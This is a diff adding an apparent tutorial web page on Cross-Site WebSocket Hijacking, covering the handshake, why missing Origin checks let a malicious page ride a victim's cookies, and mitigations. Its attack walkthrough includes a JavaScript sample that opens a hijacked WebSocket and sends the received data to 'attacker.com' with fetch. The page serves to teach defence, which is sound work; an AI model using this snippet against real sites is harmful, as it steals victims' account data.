@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cross-Site WebSocket Hijacking Explained - hacking</title>
+    <meta name="description" content="Cross-Site WebSocket Hijacking (CSWSH) is a vulnerability where an attacker tricks a victim's browser into establishing an unauthorized WebSocket connection to a vulnerable application. Because WebSockets are not restricted by the Same-Origin Policy (SOP">
+    <link rel="canonical" href="https://salivity.github.io/hacking/article/cross-site-websocket-hijacking-explained">
+    <link rel="search" type="application/opensearchdescription+xml" title="hacking" href="/hacking/opensearch.xml">
+    <link rel="icon" href="/hacking/favicon.ico">
+    <link rel="stylesheet" href="/hacking/css/style.css">
+    <link media="print" rel="stylesheet" href="/hacking/css/print.css">
+    <script src="/hacking/js/fuse.min.js"></script>
+    <script src="/hacking/js/script.js"></script>
+    <script id="MathJax-script" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/4.1.3/tex-chtml.min.js" defer></script>
+    <script src="/monetize/monetize.js"></script>
+    <script src="/social/social.js"></script>
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Cross-Site WebSocket Hijacking Explained - hacking" />
+    <meta property="og:url" content="https://salivity.github.io/hacking/article/cross-site-websocket-hijacking-explained" />
+    <meta property="og:image:url" content="https://salivity.github.io/hacking/images/open-graph/default.webp" />
+    <meta property="og:image:secure_url" content="https://salivity.github.io/hacking/images/open-graph/default.webp" />
+    <meta property="og:image:width" content="1120" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:description" content="Cross-Site WebSocket Hijacking (CSWSH) is a vulnerability where an attacker tricks a victim's browser into establishing an unauthorized WebSocket connection to a vulnerable application. Because WebSockets are not restricted by the Same-Origin Policy (SOP" />
+    <link rel="manifest" href="/hacking/pwa/manifest.json" />
+</head>
+<body>
+    <header>
+        <a href="/hacking/" aria-label="Go To Home Page" title="Go To Home Page" id="logo">
+            <span>salivity.github.io/</span><span>hacking</span>
+        </a>
+        <nav>
+            <ul class="header-links">
+                <li><a href="/hacking/search" title="Search" aria-label="Go To Search Page"><svg class="svg-icon" aria-hidden="true" focusable="false" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14"></path></svg></a></li>
+                <li><a id="theme-toggle" title="Theme" href="javascript:void(0);" aria-label="Toggle Website Theme"></a></li>
+            </ul>
+        </nav>
+    </header>
+    <main>
+        <article><h1 id="cross-site-websocket-hijacking-explained">Cross-Site WebSocket
+Hijacking Explained</h1>
+<p>Cross-Site WebSocket Hijacking (CSWSH) is a vulnerability where an
+attacker tricks a victim's browser into establishing an unauthorized
+WebSocket connection to a vulnerable application. Because WebSockets are
+not restricted by the Same-Origin Policy (SOP) during the handshake, an
+attacker can leverage the victim's existing session credentials to open
+a full-duplex communication channel. This article explains the mechanics
+of the WebSocket handshake, how attackers exploit missing origin checks
+to hijack connections, and how to defend against these attacks.</p>
+<h3 id="the-websocket-handshake-mechanism">The WebSocket Handshake
+Mechanism</h3>
+<p>The WebSocket protocol initiates via an HTTP-based handshake designed
+to upgrade the connection from HTTP to a persistent, bidirectional
+WebSocket protocol. A standard handshake request sent by the browser
+looks like this:</p>
+<pre class="http"><code>GET /chat HTTP/1.1
+Host: vulnerable-bank.com
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+Sec-WebSocket-Version: 13
+Origin: https://vulnerable-bank.com
+Cookie: session=abc123secret</code></pre>
+<p>If the server accepts the upgrade, it responds with an
+<code>HTTP/1.1 101 Switching Protocols</code> status code. Once
+complete, the HTTP connection is replaced by a continuous TCP-based
+WebSocket connection.</p>
+<h3 id="the-underlying-security-gap">The Underlying Security Gap</h3>
+<p>Unlike standard <code>fetch</code> or <code>XMLHttpRequest</code>
+calls, WebSockets are not governed by the Same-Origin Policy. Browsers
+allow cross-origin WebSocket connections by default.</p>
+<p>Security in the handshake is meant to be enforced via the
+<code>Origin</code> header, which the browser automatically generates
+and cannot be modified by client-side JavaScript. The receiving server
+is expected to inspect this header and reject any connection coming from
+an untrusted domain. When servers fail to validate the
+<code>Origin</code> header and rely solely on ambient credentials—such
+as HTTP cookies or HTTP basic authentication—they become vulnerable to
+CSWSH.</p>
+<h3 id="how-attackers-execute-the-hijack">How Attackers Execute the
+Hijack</h3>
+<p>An attacker carries out a Cross-Site WebSocket Hijacking attack
+through the following sequence:</p>
+<ol type="1">
+<li><p><strong>Session Establishment:</strong> The victim logs into
+<code>vulnerable-bank.com</code>, receiving an authentication cookie
+stored in their browser.</p></li>
+<li><p><strong>Luring the Victim:</strong> The attacker directs the
+victim to a malicious website (<code>attacker.com</code>) via phishing,
+malicious advertisements, or social engineering.</p></li>
+<li><p><strong>Triggering the Cross-Origin Connection:</strong> The
+malicious site contains JavaScript that initiates a WebSocket connection
+to the target server:</p>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> ws <span class="op">=</span> <span class="kw">new</span> <span class="bu">WebSocket</span>(<span class="st">&#39;wss://vulnerable-bank.com/chat&#39;</span>)<span class="op">;</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>ws<span class="op">.</span><span class="at">onopen</span> <span class="op">=</span> <span class="kw">function</span>() {</span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Request sensitive data or execute actions</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>    ws<span class="op">.</span><span class="fu">send</span>(<span class="bu">JSON</span><span class="op">.</span><span class="fu">stringify</span>({ <span class="dt">action</span><span class="op">:</span> <span class="st">&quot;get_account_details&quot;</span> }))<span class="op">;</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>}<span class="op">;</span></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>ws<span class="op">.</span><span class="at">onmessage</span> <span class="op">=</span> <span class="kw">function</span>(<span class="bu">event</span>) {</span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Exfiltrate stolen data to the attacker&#39;s server</span></span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a>    <span class="fu">fetch</span>(<span class="st">&#39;https://attacker.com/log?data=&#39;</span> <span class="op">+</span> <span class="pp">encodeURIComponent</span>(<span class="bu">event</span><span class="op">.</span><span class="at">data</span>))<span class="op">;</span></span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a>}<span class="op">;</span></span></code></pre></div></li>
+<li><p><strong>Credential Inclusion:</strong> When the browser issues
+the handshake <code>GET</code> request, it automatically includes the
+victim's stored cookies for <code>vulnerable-bank.com</code>, while
+setting the <code>Origin</code> header to
+<code>https://attacker.com</code>.</p></li>
+<li><p><strong>Connection Upgrade:</strong> Because the server checks
+only the cookie and fails to validate the <code>Origin</code> header, it
+accepts the handshake and completes the upgrade.</p></li>
+<li><p><strong>Bi-Directional Exploitation:</strong> The attacker's
+script on <code>attacker.com</code> now has direct access to read
+messages sent by the server and send unauthorized messages as the
+victim.</p></li>
+</ol>
+<p>Unlike traditional Cross-Site Request Forgery (CSRF), which is
+typically a one-way, blind transmission of commands, CSWSH provides a
+two-way channel. This allows the attacker to both execute state-changing
+actions and read confidential data in real time.</p>
+<h3 id="mitigation-strategies">Mitigation Strategies</h3>
+<p>Defending against Cross-Site WebSocket Hijacking requires explicit
+validation and secure design during the handshake phase:</p>
+<ul>
+<li><strong>Strict Origin Header Validation:</strong> The server must
+maintain a strict whitelist of trusted origins and reject any handshake
+where the <code>Origin</code> header does not match, returning an HTTP
+403 Forbidden status.</li>
+<li><strong>Anti-CSRF Tokens:</strong> Implement challenge tokens within
+the handshake request. Since custom headers cannot be added to native
+browser WebSocket requests, pass a unique, unpredictable token as a
+query parameter or inside the initial HTTP session setup.</li>
+<li><strong>SameSite Cookie Attribute:</strong> Configure session
+cookies with the <code>SameSite=Strict</code> or
+<code>SameSite=Lax</code> attribute. <code>SameSite=Strict</code>
+prevents the browser from sending cookies on cross-site requests
+entirely, blocking the automatic authentication required for the
+hijack.</li>
+</ul></article>
+        <div id="comments-container"></div>
+
+        <script>
+            const utterancesScript = document.createElement('script');
+            
+            utterancesScript.setAttribute('src', 'https://utteranc.es/client.js');
+            utterancesScript.setAttribute('repo', 'salivity/hacking'); 
+            utterancesScript.setAttribute('issue-term', 'pathname'); 
+            utterancesScript.setAttribute('theme', localStorage.getItem('theme') === 'dark' ? 'github-dark' : 'github-light'); 
+            utterancesScript.setAttribute('crossorigin', 'anonymous');
+            utterancesScript.async = true;
+
+            document.getElementById('comments-container').appendChild(utterancesScript);
+        </script>
+    
+    </main>
+    <footer>
+        <nav>
+            <ul class="social-links">
+            </ul>
+        </nav>
+        <nav>
+            <ul class="footer-links">
+                <li><a href="/hacking/privacy-policy">Privacy Policy</a></li>
+                <li><a href="/hacking/terms-and-conditions">Terms and Conditions</a></li>
+            </ul>
+        </nav>
+        <div class="copyright">
+            Copyright &copy; <span id="current-year"></span>
+        </div>
+    </footer>
+</body>
+</html>
